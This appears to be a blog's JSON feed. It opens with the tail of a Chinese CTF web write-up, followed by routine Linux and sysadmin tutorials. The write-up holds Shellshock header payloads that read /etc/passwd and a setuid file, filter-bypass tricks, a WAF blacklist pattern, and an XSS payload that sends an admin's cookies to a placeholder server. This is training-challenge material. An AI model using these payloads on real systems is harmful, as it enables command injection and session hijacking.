\u0026amp;\u0026amp; strlen($page) \u0026gt; 0) { 59 try { 60 include(\u0026#34;$page.php\u0026#34;); 61 } catch (Exception $e) { 62 } 63} 64 65function render_default() { ?\u0026gt; 66\u0026lt;p\u0026gt;Welcome to use our developer assistant service. We provide servial useless features to make your developing life harder.\u0026lt;/p\u0026gt; 67 68\u0026lt;img src=\u0026#34;windows-run.jpg\u0026#34; alt=\u0026#34;command executor\u0026#34;\u0026gt; 69\u0026lt;?php } 70?\u0026gt;\u0026lt;!DOCTYPE html\u0026gt; 71\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; 72 \u0026lt;head\u0026gt; 73 \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; 74 \u0026lt;title\u0026gt;Command Executor\u0026lt;/title\u0026gt; 75 \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;bootstrap/css/bootstrap.min.css\u0026#34; media=\u0026#34;all\u0026#34;\u0026gt; 76 \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;comic-neue/font.css\u0026#34; media=\u0026#34;all\u0026#34;\u0026gt; 77 \u0026lt;style\u0026gt; 78 nav { margin-bottom: 1rem; } 79 img { max-width: 100%; } 80 \u0026lt;/style\u0026gt; 81 \u0026lt;/head\u0026gt; 82 \u0026lt;body\u0026gt; 83 \u0026lt;nav class=\u0026#34;navbar navbar-expand-lg navbar-dark bg-dark d-flex\u0026#34;\u0026gt; 84 \u0026lt;a class=\u0026#34;navbar-brand\u0026#34; href=\u0026#34;index.php\u0026#34;\u0026gt;Command Executor\u0026lt;/a\u0026gt; 85 86 \u0026lt;ul class=\u0026#34;navbar-nav\u0026#34;\u0026gt; 87\u0026lt;?php foreach($pages as list($file, $title)): ?\u0026gt; 88 \u0026lt;li class=\u0026#34;nav-item\u0026#34;\u0026gt; 89 \u0026lt;a class=\u0026#34;nav-link\u0026#34; href=\u0026#34;index.php?func=\u0026lt;?=$file?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?=$title?\u0026gt;\u0026lt;/a\u0026gt; 90 \u0026lt;/li\u0026gt; 91\u0026lt;?php endforeach; ?\u0026gt; 92 \u0026lt;/ul\u0026gt; 93 \u0026lt;/nav\u0026gt; 94 95 \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt;\u0026lt;?php if(is_callable(\u0026#39;render\u0026#39;)) render(); else render_default(); ?\u0026gt;\u0026lt;/div\u0026gt; 96 \u0026lt;/body\u0026gt; 97\u0026lt;/html\u0026gt; 可以在上面看到一段 code：\n1foreach($_SERVER as $key =\u0026gt; $val) { 2 if(substr($key, 0, 5) === \u0026#39;HTTP_\u0026#39;) { 3 putenv(\u0026#34;$key=$val\u0026#34;); 4 } 5} 會將所有$_SERVER中$key為HTTP_開頭的值都放進putenv()這個 function。\n(如果你不知道 PHP 中的$_SERVER是什麼，建議先了解再繼續往下看)\n我們是不是可以利用這點，想辦法塞入符合它條件的$_SERVER中的值，使其通過putenv()。\n這題其實是在講CVE-2014-6271這個嚴重的漏洞，又稱「Shellshock」。\n至於 payload 的解釋這邊不贅述，網路上已經充斥許多關於講解CVE-2014-6271的文章可供參考。\n可以透過「() { :; }; echo \u0026quot;injected\u0026quot;」來使bash執行到echo \u0026quot;injected\u0026quot;，當然也可以換成其他更有攻擊性的語法。\n透過index.php?func=ls\u0026amp;file=/可以看到根目錄底下的檔案：\n1total 88 2drwxr-xr-x 2 root root 4096 Jan 19 2018 bin 3drwxr-xr-x 2 root root 4096 Apr 12 2016 boot 4drwxr-xr-x 5 root root 340 Jan 5 14:34 dev 5drwxr-xr-x 85 root root 4096 Jan 19 2018 etc 6-r-------- 1 flag root 37 Jan 9 2018 flag # flag 在這 7-rwsr-xr-x 1 flag root 9080 Jan 19 2018 flag-reader # 奇怪的檔案 8-rw-r--r-- 1 root root 653 Jan 9 2018 flag-reader.c # 疑似奇怪檔案的原始碼 9drwxr-xr-x 2 root root 4096 Apr 12 2016 home 10-rwxr-xr-x 1 root root 100 Jan 9 2018 init 11drwxr-xr-x 12 root root 4096 Jan 19 2018 lib 12drwxr-xr-x 2 root root 4096 Jan 19 2018 lib64 13drwxr-xr-x 2 root root 4096 May 3 2016 media 14drwxr-xr-x 2 root root 4096 May 3 2016 mnt 15drwxr-xr-x 2 root root 4096 May 3 2016 opt 16dr-xr-xr-x 386 root root 0 Jan 5 14:34 proc 17drwx------ 2 root root 4096 Feb 16 2018 root 18drwxr-xr-x 6 root root 4096 Feb 17 2019 run 19drwxr-xr-x 2 root root 4096 Jan 19 2018 sbin 20drwxr-xr-x 2 root root 4096 May 3 2016 srv 21dr-xr-xr-x 13 root root 0 Jan 5 14:34 sys 22drwxrwx-wt 2 root root 4096 Feb 3 14:12 tmp 23drwxr-xr-x 19 root root 4096 Feb 16 2018 usr 24drwxr-xr-x 22 root root 4096 Jan 23 2018 var 看來flag又是無法直接讀取，但應該能透過執行flag-reader來讀取flag。\n開始嘗試在 request 中把 payload 塞進 header：\n個人習慣使用burp，請自行選擇方便使用的軟體來抓取封包：\n塞入測試用的自訂檔頭X-Hacker其值為() { :; }; echo \u0026quot;testing\u0026quot;。\n似乎被擋下來了，再回過頭去 view source code：\n1$black_list = [ 2 \u0026#39;\\/flag\u0026#39;, \u0026#39;\\(\\)\\s*\\{\\s*:;\\s*\\};\u0026#39; 3]; 4 5function waf($a) { 6 global $black_list; 7 if(is_array($a)) { 8 foreach($a as $key =\u0026gt; $val) { 9 waf($key); 10 waf($val); 11 } 12 } else { 13 foreach($black_list as $b) { 14 if(preg_match(\u0026#34;/$b/\u0026#34;, $a) === 1) { 15 fuck(\u0026#34;$b detected! exit now.\u0026#34;); 16 } 17 } 18 } 19} 20 21waf($_SERVER); 要想辦法繞過'\\(\\)\\s*\\{\\s*:;\\s*\\};'。\n但其實\u0026hellip;這樣的防禦有跟沒有一樣，你只需要塞個空格給它，就繞過了。\n把值改成() { : ; }; echo \u0026quot;testing\u0026quot;就成功執行了。\n到此已經拿到了 shell，但要怎麼把flag讀取並輸出？\n由於權限不夠，無法直接cat，那麼先看看flag-reader.c裡頭到底寫了什麼。\npayload「() { : ; }; cat /flag-reader.c」：\n跟前面一樣被擋下，但這並沒有意義，直接繞過即可。\n嘗試「() { : ; }; cat /fla?-reader.c」卻發現什麼也沒執行，不知道為什麼無法直接輸入cat指令，但還是可以透過/bin/cat來執行。\n所以 payload 改成「() { : ; }; /bin/cat /fla?-reader.c」。\nflag-reader.c：\n1#include \u0026lt;unistd.h\u0026gt; 2#include \u0026lt;syscall.h\u0026gt; 3#include \u0026lt;fcntl.h\u0026gt; 4#include \u0026lt;string.h\u0026gt; 5 6int main(int argc, char *argv[]) 7{ 8 char buff[4096], rnd[16], val[16]; 9 if(syscall(SYS_getrandom, \u0026amp;rnd, sizeof(rnd), 0) != sizeof(rnd)) { 10 write(1, \u0026#34;Not enough random\\n\u0026#34;, 18); 11 } 12 13 setuid(1337); 14 seteuid(1337); 15 alarm(1); 16 write(1, \u0026amp;rnd, sizeof(rnd)); 17 read(0, \u0026amp;val, sizeof(val)); 18 19 if(memcmp(rnd, val, sizeof(rnd)) == 0) { 20 int fd = open(argv[1], O_RDONLY); 21 if(fd \u0026gt; 0) { 22 int s = read(fd, buff, 1024); 23 if(s \u0026gt; 0) { 24 write(1, buff, s); 25 } 26 close(fd); 27 } else { 28 write(1, \u0026#34;Can not open file\\n\u0026#34;, 18); 29 } 30 } else { 31 write(1, \u0026#34;Wrong response\\n\u0026#34;, 16); 32 } 33} 一開始程式會有三個變數，分別是buff[4096]、rnd[16]及val[16]。\n接著會開始生成隨機數並寫進rnd記憶體地址。\n之後就調用了setuid()、seteuid()把使用者設定為1337。\n我們可以用「() { : ; }; /bin/cat /etc/passwd」來查看passwd：\n1root:x:0:0:root:/root:/bin/bash 2. 3. 4. 5flag:x:1337:1337::/home/flag: 會發現 id 1337正是/flag這個檔案的擁有者，也叫做flag。\n接著會將執行write(1, \u0026amp;rnd, sizeof(rnd))產生的亂數輸出。\n但接著下一行馬上執行read(0, \u0026amp;val, sizeof(val))讀取val。\n之後就判斷rnd及val是否相等，如果相等才會讀取檔案。\n也就是說\u0026hellip; 你需要在它輸出的一瞬間，將值輸入val。\n這裡提供一個方法，就是用檔案來重定向read取代原本的val，只需要program \u0026gt; file \u0026lt; file這樣的格式即可。\n在shell中，有幾種方式可以來針對輸出入做重定向。\n\u0026gt;輸出重定向，例如echo \u0026quot;test\u0026quot; \u0026gt; file，原本的echo會將結果輸出到螢幕上(\u0026amp;1)，但因為我們使用\u0026gt;來重新指定輸出到file，所以結果將會改成寫入file而非顯示在螢幕。 \u0026gt;\u0026gt;以append的方式輸出重定向，例如echo \u0026quot;test\u0026quot; \u0026gt;\u0026gt; file，則會在file後方加上test，而非覆蓋整個檔案。 \u0026lt;輸入重定向，舉例有個程式正在等待使用者輸入，你可以使用program \u0026lt; file來自動的輸入file中的內容。它將原本等待使用者的輸入給定向到file。 它們是可以混合運用的，舉例program \u0026lt; input \u0026gt; output表示將program輸入重新定向到input中，並將輸出重定向到output。\n了解這些後可以開始嘗試了。\n由於大部分目錄都沒有寫入權限，所以寫在/var/tmp中吧(大多時候這邊是可寫的)：\npayload：() { : ; }; cd /; fla?-reader fla? \u0026gt; /var/tmp/abc \u0026lt; /var/tmp/abc。\n接著你可以在/var/tmp/中看到你重新定向輸出所寫入的檔案abc(居然也看得到別人的，還被 XSS = =)：\n之後再() { : ; }; cd /; /bin/cat /var/tmp/abc即可查看輸出內容：\n前面的亂碼是隨機產生的亂數所組成的，有些是不可視字元，但足以看到後方的 flag 了。\nFlag FLAG{W0w U sh0cked m3 by 5h3115h0ck}\n38. xssme # XSS admin to steal flag\n點擊右上角的register後，可以看到這些欄位：\n可以看到密碼寫著「Your login password, will NOT be protected properly.」，也就是說會以明文的方式存放。\n不確定這裡算不算攻擊點，總之先註冊一個帳號試試。\n註冊完後登入，可以看到上方多了幾個功能：\n看來就是需要寄送一封帶有XSS的信件給管理員了，點擊Send Mail，先嘗試寄送一則測試郵件：\n下方只是個模擬驗證功能，按下「I'm a robot」即可。(我還以為是題目)\n可以在「Sent Mail」看到已送出的信件：\n開始隨便嘗試一些語法：\n發現「)」與「onerror」都被擋了，後續也嘗試許多都被阻擋。\n但仔細看可以發現，它所阻擋的並非是onerror，而是前面有多個空格。\n我們可以在前方加個斜線/取代空格，這算是一個html的特性，同理onload也是如此。\n我們的目的是獲得管理員的身份，偷取他的session。\n我們可以自己架設伺服器來接收等等xss讓管理員送出的請求，又或者線上有許多服務可以幫你代收請求。\n(例子所使用的服務是hookb.in)\n經過嘗試後，發現可用的 payload 如下(https://your-server.com為用於接收及紀錄請求的伺服器)：\n1\u0026lt;svg/onload=\u0026#34;self.location=\u0026#39;https://your-server.com/?x=\u0026#39;+document.cookie\u0026#34;\u0026gt; 接著等待管理者打開信件，在 server 上就可以收到請求「x: PHPSESSID=8atmu7fv1qee87g0vckelq13o3; FLAG_XSSME=FLAG{Sometimes, XSS can be critical vulnerability \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;}; FLAG_2=IN_THE_REDIS」。\nFlag FLAG{Sometimes, XSS can be critical vulnerability \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;}。\n","date":"2022/04/11","externalUrl":null,"permalink":"/posts/ctf-hackme-web-write-up/","section":"","summary":"","title":"CTF 「hackme」Web Write Up","type":"posts"},{"content":"Change the password of root in mysql version 8\nmysqld_safe # You maybe need sudo in your case.\n1# turn off mysqld 2/etc/init.d/mysql stop 3 4# use safe mode 5mysqld_safe --skip-grant-tables \u0026amp; If it show the error message:\n1mysqld_safe Logging to \u0026#39;/var/log/mysql/error.log\u0026#39;. 2mysqld_safe Directory \u0026#39;/var/run/mysqld\u0026#39; for UNIX socket file don\u0026#39;t exists. Try this before run the safe mode of mysqld:\n1mkdir -p /var/run/mysqld 2chown mysql:mysql /var/run/mysqld Change password # In this mode, you can login root without password.\n1mysql -u root In the old version(MySQL version lower than 8), you may use SET PASSWORD=PASSWORD('password'); to change password.\nBut in version 8, you need to change the method:\n1USE mysql; 2ALTER USER \u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED WITH mysql_native_password BY \u0026#39;password\u0026#39;; 3FLUSH PRIVILEGES; 4exit; Start the service\n1killall mysqld 2/etc/init.d/mysqld start Try it\n1mysql -u root -p 2# type password ","date":"2022/01/29","externalUrl":null,"permalink":"/posts/mysql-8-change-root-password/","section":"","summary":"\u003cp\u003eChange the password of root in mysql version 8\u003c/p\u003e","title":"Change root password in MySQL 8","type":"posts"},{"content":"","date":"2022/01/29","externalUrl":null,"permalink":"/series/sql-basic/","section":"Series","summary":"","title":"SQL-Basic","type":"series"},{"content":"","date":"2022/01/27","externalUrl":null,"permalink":"/tags/disk/","section":"Tags","summary":"","title":"Disk","type":"tags"},{"content":"如果發現當初掛載好的空間不夠用了，那麼擴充硬碟上去，然後照著步驟一步步的將檔案們搬家吧。\n注意 # 本文所提到的操作，若是操作不當則可能導致不可逆的結果，使用前請慎重考慮，並做好資料備份的習慣。 以下所提到的指令大多數都需要 root 權限，請應個人需求加上 sudo 或是以 root 身份執行(不推薦)。 格式化新分區 # 搬家前要先找好家。\n舉例要將 /home 搬至 sda1，則先將 sda1 用 mkfs 指令格式化 ：\n1mkfs -t ext4 /dev/sda1 參數 -t 可以指定格式，如上指令表示將其指定為 ext4。(大多數 linux 通用)\n備份 /home 到新分區 # 先將剛剛格式化好的分區掛載到 /mnt 中。\n1mkdir /mnt/home 2mount /dev/sda1 /mnt/home 之後就可以開始備份了，雖然也可以直接複製貼上，但建議使用指令 rsync 更有效率：\n1rsync -avx /home/* /mnt/home 確認是否備份成功：\n1ls -al /mnt/home 設定自動掛載 # 當我們想掛載硬碟時，會用到 mount 指令。\n但若每次開機都要手動 mount 那些 boot、home 則會很麻煩，幸好它們總是被自動的掛載。\n在 Ubuntu 系統下，有個檔案 /etc/fstab 就是用來設定系統在初始時要如何自動掛載硬碟。\n由於我們的 /home 已經複製一份到 /dev/sda1，掛載的位置有變，所以需要編輯 /etc/fstab 這個檔案。\n需要在檔案中加入一筆掛載敘述，格式如下：\n[Device] [Mount Point] [File System Type] [Options] [Dump] [Pass] 欄位間隔以 tab 字元隔開。\n在但此之前，我們必須先知道我們要寫入的分區名字。\n對使用者而言，分區很直覺叫做 /dev/sda1，但電腦卻只認 UUID。\n獲取分區的 UUID：\n1blkid /dev/sda1 沒意外會出現類似這樣的訊息：\n1/dev/sda1: UUID=\u0026#34;3b8ad4ae-1af5-4f2f-b6ce-b17c1ecaa336\u0026#34; TYPE=\u0026#34;ext4\u0026#34; PARTUUID=\u0026#34;42d822b8-ebba-4cb4-aad1-f31234d02d30\u0026#34; P.s. 若是沒有出現訊息，則可能表示該分區名稱輸入錯誤，或者權限不足。\n記好該分區的 UUID ，並在 /etc/fstab 最下面加上一行(記得 UUID 更換成自己的)：\nUUID=3b8ad4ae-1af5-4f2f-b6ce-b17c1ecaa336\t/home\text4\terrors=remount-ro\t0\t1 這麼一來系統就會知道下一次要將 /dev/sda1 這個分區的內容掛載到 /home 底下，而該分區內裝的正是剛剛所備份進去的 /home。\n請注意！ # 若是在 /etc/fstab 看到先前的掛載的資料中已經存在 /home ，則可能表示你當前的 /home 也是從其他硬碟掛載來的，請將該行註解或刪除，以免重複掛載在同個目錄。\n刪除 /home # 接著將使用者切換到 root，並清空家目錄。\n!使用最高權限輸入指令請特別留意!\n1sudo -i 2rm /home -R 之後再創建新的目錄(怕它掛載找不到位置)\n1mkdir /home 重新開機 # 確定上述步驟都做確實後，重新啟動驗收結果吧：\n1reboot 開機後可能遇到的問題 # 如果開機後一切正常那麼恭喜你。\n但結果若是有\u0026hellip;點不如預期，或許你該繼續看下去：\n在登入頁面輸入完密碼後卻卡住了！？\n這可能是因為 /home 沒有被成功掛載，所以系統內部正在出錯。\n試著找出問題，先進入純 command line 的 tty (按下 ctrl+alt+6 即可切換到 tty6)，接著到登入，可能在登入後依舊會卡住一陣子，這是正常的，畢竟家目錄找不到了(系統問號中)，不過沒意外應該會在找不到家目錄後將你丟到根目錄下。\n成功登入後，到 /home 底下看看，如果是空的則證實猜想，/home 沒有被成功掛載。\n常見的原因可能是找不到路徑，或者寫入 /etc/fstab 的格式錯誤，導致無法辨識等。\n先掛載硬碟並檢查內部檔案是否為原本 /home 底下的檔案：\n1mount /dev/sda1 /mnt/home 2ls -al /mnt/home 它應該是直接顯示 /home 底下的所有檔案，例如：\n1.\t..\tguest\tuser1\tuser2 而不會是\u0026hellip;\n1home 如果內容為空，則表示在備份後，沒有做好確認，可能過程有什麼問題導致沒有成功備份。(這個直接放棄治療)\n若內容是 home，而使用者目錄都在裡面，所以路徑是 /mnt/home/home，則表示在備份時沒有設定好備份路徑，這問題不大，你只需要將裡頭的檔案往外拉出一層目錄即可。\n1mv /mnt/home/home/* /mnt/home 2# 確認檔案都移動出來了 3ls -al /mnt/home/home 4ls -al /mnt/home 5# 刪除多出來的目錄 6rm /mnt/home/home -R 之後重新啟動即可。\n","date":"2022/01/27","externalUrl":null,"permalink":"/posts/ubuntu-move-home-to-new-disk/","section":"","summary":"\u003cp\u003e如果發現當初掛載好的空間不夠用了，那麼擴充硬碟上去，然後照著步驟一步步的將檔案們搬家吧。\u003c/p\u003e","title":"Ubuntu 更換 /Home 到新硬碟","type":"posts"},{"content":"在 Ubuntu 用 PPPoE 連線中華電信固定 IP。\nInstall 「pppoeconf」 # 1# update package first 2apt-get update -y 1apt-get install pppoeconf -y Configure it # 記得先插上家裡的數據機後，輸入以下指令：\n1pppoeconf # maybe need \u0026#34;sudo\u0026#34; 正在查找可以使用的網卡 可能會顯示偵測不到可以使用的網卡\u0026hellip;\n偵測不到可以使用的網卡 那就手動指定它(前提是你知道是哪張網卡並確定有連上數據機)：\n1pppoeconf eth0 接著就是問答時間。\n基本上沒有特別需求的話就是除了輸入帳號及密碼外，其他都是一路回答「YES」就可以了。\nP.S.\n中華電信的帳號通常會是「帳號@hinet.net」，如果是固定 IP 則是「帳號@ip.hinet.net」。\n設定檔沒意外會存在「/etc/ppp/peers/dsl-provider」\n如果連接成功，應該可以看到網卡(通常叫做ppp0)：\n1$ ifconfig 2 3lo: ................ 4eth0: ................ 5ppp0: ................ 6wlan0: ................ 手動連接及斷開 # 手動連接\n1pon dsl-provider 手動斷開\n1poff dsl-provider 2# 或者斷開全部 3poff -a ","date":"2022/01/21","externalUrl":null,"permalink":"/posts/ubuntu-pppoe-connection/","section":"","summary":"\u003cp\u003e在 Ubuntu 用 PPPoE 連線中華電信固定 IP。\u003c/p\u003e","title":"How to use PPPoE to connect network on Ubuntu?","type":"posts"},{"content":"","date":"2022/01/21","externalUrl":null,"permalink":"/tags/pppoe/","section":"Tags","summary":"","title":"PPPoE","type":"tags"},{"content":"How to build the FTP Server quicly with 「vsftpd」?\nInstall service 「vsftpd」 # In ubuntu, you just need to run the following command for installation:\n1apt-get install vsftpd -y Configure the vsftpd # You can find the config file of vsftpd in /etc/vsftpd.conf or /etc/vsftpd/vsftpd.conf probably.\nThere have many settings, but mostly the options you only need to care are below:\nanonymous_enable - If you want that the ftp is allow to connect by anonymous user, change it to YES.(NOT Recommended) write_enable - Set it to YES to make the user writeable. allow_writeable_chroot - Set it to YES to allow the user writeable in home directory. chroot_local_user - When the option is set to YES, it means that the user can only access their home directory. chroot_list_enable, chroot_list_file - These options usually work with chroot_local_user as an exception. If chroot_local_user=YES If chroot_list_enable=YES - This means all users are restricted to their home directory except the users in chroot_list_file. If chroot_list_enable=NO - This means all users are restricted to their home directory and no exception. If chroot_local_user=NO If chroot_list_enable=YES - This means all users are NOT restricted to their home directory except the users in chroot_list_file. If chroot_list_enable=NO - This means all users are NOT restricted to their home directory and no exception. chroot_list_file=/etc/vsftpd/chroot_list - This option is setting where the chroot list file is, and the content of file looks like following: root, user1, user2 pam_service_name=ftp - The default value is vsftpd, but if you are setting the shell /usr/sbin/nologin to the ftp users, it\u0026rsquo;s gonna be not working probably. (ps. pls search by google for details) userlist_enable - If set it to YES means can only the specific users be login in vsftpd. userlist_deny - Opposite of userlist_enable option, if set it to YES means all users are allow to login in vsftpd except the specific users. userlist_file=/etc/vsftpd/user_list - Setting where is the file for specific users in two above options. Restart the service # Don\u0026rsquo;t forget to restart the service so it can run in the new configuration.\n1service vsftpd restart ","date":"2022/01/19","externalUrl":null,"permalink":"/posts/ftp-server-vsftpd/","section":"","summary":"\u003cp\u003eHow to build the FTP Server quicly with 「vsftpd」?\u003c/p\u003e","title":"Build a FTP Server with 「vsftpd」","type":"posts"},{"content":"","date":"2022/01/19","externalUrl":null,"permalink":"/tags/ftp/","section":"Tags","summary":"","title":"FTP","type":"tags"},{"content":"","date":"2022/01/19","externalUrl":null,"permalink":"/tags/raspberry-pi/","section":"Tags","summary":"","title":"Raspberry PI","type":"tags"},{"content":"How to make ubuntu auto connect to wifi in raspberry pi 4?\nGoogle said\u0026hellip; # When you google 「raspberry pi 4 ubuntu auto wifi」\u0026hellip;\nMost people said:\nFind the file /etc/wpa_supplicant/wpa_supplicant.conf, edit it, add the following setting:\n1network={ 2 ssid=\u0026#34;Your-Wifi-SSID\u0026#34; 3 psk=\u0026#34;Your-Wifi-Password\u0026#34; 4} Then save it, put the sd card back into raspberry pi, turn on the power, it\u0026rsquo;s working!\nIf not working # If the solustion above working to you, then conguatulations.\nBut if it\u0026rsquo;s not working on your case as mine, try the following method, that is working in my case:\nFind the config file /etc/netplan/50-cloud-init.yaml, edit it to the following setting:\n1network: 2 ethernets: 3 eth0: 4 dhcp4: true 5 optional: true 6 version: 2 7 wifis: 8 wlan0: 9 dhcp4: true 10 optional: true 11 access-points: 12 \u0026#34;Your-Wifi-SSID\u0026#34;: 13 password: \u0026#34;Your-Wifi-Password\u0026#34; Don\u0026rsquo;t forget to save, then try again.\n","date":"2022/01/19","externalUrl":null,"permalink":"/posts/raspberry-pi4-ubuntu-wifi-configure/","section":"","summary":"\u003cp\u003eHow to make ubuntu auto connect to wifi in raspberry pi 4?\u003c/p\u003e","title":"Raspberry Pi 4 (Ubuntu) configure auto connect to wifi","type":"posts"},{"content":"","date":"2021/09/24","externalUrl":null,"permalink":"/tags/grub/","section":"Tags","summary":"","title":"Grub","type":"tags"},{"content":"安裝了 Linux + Windows 的雙系統，但卻不見開機選單？放心，很多人跟你一樣。\n事先聲明 # 在磁區間操作有一定風險，若操作不當導致不可逆的後果，本站概不負責。 本文全程以 Ubuntu 20.04.3 LTS 操作，其他版本不一定適用。 MBR (Master Boot Record, 主啟動磁區) # 首先，一般計算機在開機時，會先執行 BIOS 之後才進入 OS。\n但其實準確的說，在進入 OS 前，會先經過 MBR (Master Boot Record)，也就是 主啟動磁區。\n至於進入哪個作業系統，這就靠 MBR 的設定了。\nBoot Loader (開機引導) # 雙系統並非什麼新鮮事，但對新手來說，可能會持續糾結 Dual Booting 的問題好一陣子。\n為了方便使用雙系統，大多數的作法是在進入 OS 前，載入一個選單，由使用者手動選擇來決定使用哪個 OS 以達到雙系統的目的。而這個選單就是大家所說的 Boot Loader (開機引導)。\n其中 GNU Project 中的程式「GRUB (GRand Unified Bootloader)」極具代表性。\n而 Ubuntu 預設就會安裝 Grub(以下以 Ubuntu 做解說)\nLinux + Windows 雙系統 # 若使用者在已有 Windows System 下的計算機安裝第二(或更多)個系統，那對 MBR 會有什麼影響？\n當計算機只有單一系統時，MBR 理所當然的只會進入該系統。\n但若是安裝了第二個系統，這時 MBR 有著極大的可能會被第二個系統所覆寫，進而導致一個「MBR 會指向越晚安裝的系統」的現象。\n安裝 OS 的順序也有關係？ # 正因為大多數情況下 MBR 會被最後一個安裝的系統給覆蓋設定，因此若是最後一個安裝的系統有如 GURB 之類的開機引導，那麼就可以成功顯示開機選單。\n因此大多數情況下都會建議使用者先安裝 Windows 後，才安裝 Linux。\n由於前面提到的，Ubuntu 預設會自動為使用者安裝 Grub，因此若是先安裝 Windows 再安裝 Ubuntu 的話，那麼 MBR 將會指向 Linux 的 Boot Loader 也就是 Grub。\n我偏要先安裝 Linux 再裝 Windows # 同理，若是讓 MBR 指向 Windows 的 Boot Loader，那將不會有 Grub，也就是會直接進入 Windows。\n即便如此，在某些情況下仍然有著需要最後安裝 Windows 的需求。\n而大多數的新手玩家在安裝完雙系統後，發現開機選單消失，大多數都是因為上述原因。\n這時候其實只需要手動再安裝一次 Grub 即可。\n正式開始 - 手動安裝 Grub 以覆寫 MBR 設定 # Step. 1 - 準備 Ubuntu Live CD # 你需要準備一個裝有 Ubuntu OS 的開機碟，靠它來協助你手動安裝 Grub。\nStep. 2 - 進入 Ubuntu # 利用開機碟進入 Ubuntu 的安裝界面。\n注意！\n別急著按下安裝，我們僅需要使用試用模式即可，按下「Try Ubuntu (試用 Ubuntu)」後進入 Ubuntu 桌面環境。\nStep. 3 - 確定 EFI、Ubuntu 及 Ubuntu\u0026rsquo;s Boot 所在磁區 # 接著掛載原有的 Ubuntu 安裝區。\n使用 fdisk -l 指令查看當前磁區狀況。記得使用 root 權限執行。\n1$ sudo fdisk -l 2...... 3Device Start End Sectors Size Type 4/dev/sda1 2048 624639 622592 304M EFI System 5...... 6/dev/sda4 173963264 886562815 712599552 339.8G Linux filesystem 7/dev/sda5 886562816 891875327 5312512 2.5G Linux filesystem 8...... 每個人的磁區編號不同，以上面例子來說：\n/dev/sda1 為 EFI System。EFI 的磁區編號不重要，記得是在哪個硬碟就好，如上述為 /dev/sda。 而 Ubuntu 則是裝在 /dev/sda4。 若當初在安裝 Ubuntu 時，有選擇另外分割 Boot，那麼就會看到如例子中的 /dev/sda5，反之則沒有。 Step. 4 - Mount Ubuntu and its Boot # 確認完計算機上的磁區後，就可以開始操作了。\n首先先將 Ubuntu mount 起來，以下的磁區請依個人在 Step. 3 所見更改。\n1sudo mount /dev/sda4 /mnt 2sudo mount /dev/sda5 /mnt/boot/efi # 若 Boot 有獨立分割才需要 Step. 5 - 安裝 Grub # 1$ sudo chroot /mnt 2$ grub-install /dev/sda # 請自行依照個人在 `Step. 3` 所見的 EFI 磁碟編號更改。 3...... 4$ update-grub 5...... Step. 6 - 重新開機，迎接 Grub 的到來 :) # 1reboot 安裝過程報錯 # cannot find efi directory 這可能是因為 Grub 安裝程式抓不到你掛載下來的 EFI 目錄，這時請在 grub-install 後加上參數「--efi-directory=/mnt/boot/efi」來指定。 若還有其他錯誤，那麼請試著將路徑參數手動指定 (請自行確認計算機上的路徑)：\n1grub-install --boot-directory=/mnt/boot --efi-directory=/mnt/boot/efi --target=x86_64-efi 若錯誤依舊無法解決，那麼可能是在前面幾個步驟出錯，請自行再檢查一次，或者將錯誤訊息丟上 Google，以及到 Ubuntu 社群「askubuntu.com」看看大家的討論。\n不再自動進入 Windows，改為自動進入 Ubuntu ！？開機選單呢！！ # 編輯以下檔案：\n1sudo vim /etc/default/grub 找到「GRUB_TIMEOUT_STYLE=hidden」在前方加上「#」註解掉，即「#GRUB_TIMEOUT_STYLE=hidden」，保存並關閉。\n在更早的版本中則是「GRUB_HIDDEN_TIMEOUT=0」，一樣將其註解為「#GRUB_HIDDEN_TIMEOUT=0」後保存。\n沒意外的話就可以在 Reboot 之後看見 Grub 選單了！\n","date":"2021/09/24","externalUrl":null,"permalink":"/posts/dual-boot-with-grub/","section":"","summary":"\u003cp\u003e安裝了 Linux + Windows 的雙系統，但卻不見開機選單？放心，很多人跟你一樣。\u003c/p\u003e","title":"Linux + Win 雙系統卻不見 Grub 開機選單？","type":"posts"},{"content":"","date":"2021/09/24","externalUrl":null,"permalink":"/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"Did you know that SSH can make your host as a proxy server?\nSSH # Connecte to the remote host with SSH:\n1# ssh \u0026lt;user-name\u0026gt;@\u0026lt;host-ip\u0026gt; 2# example 3ssh alpaca@192.168.0.2 4# the default port of SSH is 22, or you can use the parameter \u0026#34;-p\u0026#34; to specify the ssh port of the remote host. Local port forwarding (TCP port / Unix socket forward) # Forward local TCP Port or Unix Socket with parameter \u0026ldquo;-L\u0026rdquo;.\n1-L [bind_address:]port:host:hostport 2-L [bind_address:]port:remote_socket 3-L local_socket:host:hostport 4-L local_socket:remote_socket Specifies that connections to the given TCP port or Unix socket on the local (client) host are to be for-warded to the given host and port, or Unix socket, on the remote side.\n1# example 2ssh -L 8877:192.168.0.101:7766 alpaca@192.168.0.102 In the example above, it will forward the connections that given in arg(192.168.0.102) from local port 8877 to remote server port 7766 , and compelete the progress.\nReverse tunneling # It\u0026rsquo;s used in the same way as Local port forwarding (-L), just reverse.\n1-R [bind_address:]port:host:hostport 2-R [bind_address:]port:local_socket 3-R remote_socket:host:hostport 4-R remote_socket:local_socket 5-R [bind_address:]port Specifies that connections to the given TCP port or Unix socket on the remote (server) host are to be forwarded to the local side.\n1# example 2ssh -R 192.168.0.101:7766:localhost:8085 alpaca@192.168.0.102 It will forward the traffic from 192.168.0.101:7766 to localhost:8085.\nIf it\u0026rsquo;s not working # Probably is because of permission denied.\nGo to check the file /etc/ssh/sshd_config on ssh server, and find the option GatewayPorts, set it yes.\n(If it\u0026rsquo;s annotated, uncomment it first, or can\u0026rsquo;t find the option, just add it by yourself.)\nAnd don\u0026rsquo;t forget to restart the ssh server.\nMake the host a proxy server with SSH (Dynamic Tunneling) # In SSH commands, we can use parameter \u0026ldquo;-D\u0026rdquo; to make a tunnel between local host and remote server.\nSpecifies a local “dynamic” application-level port forwarding.\nFor example:\n1# ssh \u0026lt;user-name\u0026gt;@\u0026lt;host-ip\u0026gt; [-D [bind_address:]port] 2# example 3ssh alpaca@123.123.123.123 -D 1234 We made a tunnel that connects host 